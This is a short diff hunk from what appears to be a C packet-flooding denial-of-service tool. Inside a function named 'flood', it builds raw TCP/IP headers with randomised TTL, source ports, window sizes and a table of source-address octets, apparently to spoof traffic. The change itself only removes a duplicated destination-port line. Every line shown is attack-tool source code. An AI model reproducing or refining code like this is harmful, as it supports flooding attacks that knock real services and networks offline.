@@ -236,7 +236,6 @@ void *flood(void *par1)
         tcph->dest = htons(floodport);
         iph->ttl = randnum(64, 255);
         tcph->source = htons(randnum(1023, 65535));
-        tcph->dest = htons(floodport);
         tcph->window = htons(windows[randnum(0, 2)]);
 
         uint8_t first_octet_options[16] = {151, 188, 37, 51, 176, 5, 92, 172, 8, 198, 192, 155, 140, 144, 55, 132};
